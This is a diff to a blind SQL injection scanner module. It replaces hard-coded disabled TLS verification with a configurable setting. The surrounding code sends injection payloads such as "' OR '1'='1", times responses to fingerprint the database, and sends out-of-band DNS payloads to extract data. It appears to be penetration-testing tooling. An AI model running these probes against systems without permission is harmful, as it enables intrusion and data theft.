@@ -4,6 +4,7 @@ from enum import Enum
 
 from tools.log_utils import get_logger
 from tools.http_client import build_url
+from tools.settings import settings
 
 logger = get_logger("sqli_blind")
 
@@ -130,7 +131,7 @@ class ResponseClassifier:
         try:
             start = time.time()
             r1 = self.sess.get(build_url(url, param, true_payload),
-                               timeout=self.timeout, verify=False)
+                               timeout=self.timeout)
             self.true_len = len(r1.text)
             self.true_text = r1.text
             self.baseline_time = time.time() - start
@@ -140,7 +141,7 @@ class ResponseClassifier:
 
         try:
             r2 = self.sess.get(build_url(url, param, false_payload),
-                               timeout=self.timeout, verify=False)
+                               timeout=self.timeout)
             self.false_len = len(r2.text)
             self.false_text = r2.text
         except Exception as e:
@@ -155,7 +156,7 @@ class ResponseClassifier:
             return None
         try:
             r = self.sess.get(build_url(url, param, payload),
-                              timeout=self.timeout, verify=False)
+                              timeout=self.timeout)
             cur_len = len(r.text)
             cur_text = r.text
 
@@ -209,7 +210,7 @@ class BlindInjector:
             sleep_payload = "' OR '1'='1"
             try:
                 r = self.sess.get(build_url(url, param, sleep_payload),
-                                  timeout=self.timeout, verify=False)
+                                  timeout=self.timeout)
                 body = r.text.lower()
                 if re.search(r"mysql|maria|sql syntax", body):
                     return "mysql"
@@ -230,7 +231,7 @@ class BlindInjector:
             try:
                 start = time.time()
                 self.sess.get(build_url(url, param, payload),
-                              timeout=self.timeout + 3, verify=False)
+                              timeout=self.timeout + 3)
                 elapsed = time.time() - start
                 if elapsed >= self.sleep_time * 0.7:
                     return dbms
@@ -245,7 +246,7 @@ class BlindInjector:
             try:
                 start = time.time()
                 self.sess.get(build_url(url, param, "1"),
-                              timeout=self.timeout, verify=False)
+                              timeout=self.timeout)
                 times.append(time.time() - start)
             except Exception:
                 pass
@@ -309,7 +310,7 @@ class BlindInjector:
             try:
                 start = time.time()
                 self.sess.get(build_url(url, param, gt_payload),
-                              timeout=self.timeout + sleep_dur + 1, verify=False)
+                              timeout=self.timeout + sleep_dur + 1)
                 elapsed = time.time() - start
             except Exception:
                 elapsed = 0
@@ -321,7 +322,7 @@ class BlindInjector:
                 try:
                     start = time.time()
                     self.sess.get(build_url(url, param, eq_payload),
-                                  timeout=self.timeout + sleep_dur + 1, verify=False)
+                                  timeout=self.timeout + sleep_dur + 1)
                     elapsed2 = time.time() - start
                 except Exception:
                     elapsed2 = 0
@@ -381,7 +382,7 @@ class BlindInjector:
         payload = tpl % query
         try:
             r = self.sess.get(build_url(url, param, payload),
-                              timeout=self.timeout, verify=False)
+                              timeout=self.timeout)
             patterns = ERROR_EXTRACT_REGEX.get(self.dbms, [])
             for pat in patterns:
                 m = re.search(pat, r.text, re.IGNORECASE)
@@ -505,7 +506,7 @@ def check_oob_dns(url: str, param: str, oob_domain: str,
                   timeout: float = 10.0) -> Dict:
     import requests
     if sess is None:
-        sess = requests.Session()
+        sess = requests.Session(); sess.verify = settings.verify_ssl
     result = {"vulnerable": False, "findings": []}
 
     detector = BlindInjector(sess, timeout)
@@ -536,7 +537,7 @@ def check_oob_dns(url: str, param: str, oob_domain: str,
     for key, q in queries.items():
         try:
             oob_payload = tpl % (q, oob_domain)
-            sess.get(build_url(url, param, oob_payload), timeout=timeout, verify=False)
+            sess.get(build_url(url, param, oob_payload), timeout=timeout)
             result["findings"].append({
                 "type": "oob_dns",
                 "detail": f"OOB DNS payload sent for {key} via {dbms}",
@@ -559,7 +560,7 @@ def check(url: str, param: str, sess: Optional["requests.Session"] = None,
           post_data: dict = None) -> Dict:
     if sess is None:
         import requests
-        sess = requests.Session()
+        sess = requests.Session(); sess.verify = settings.verify_ssl
 
     injector = BlindInjector(sess, timeout)
 
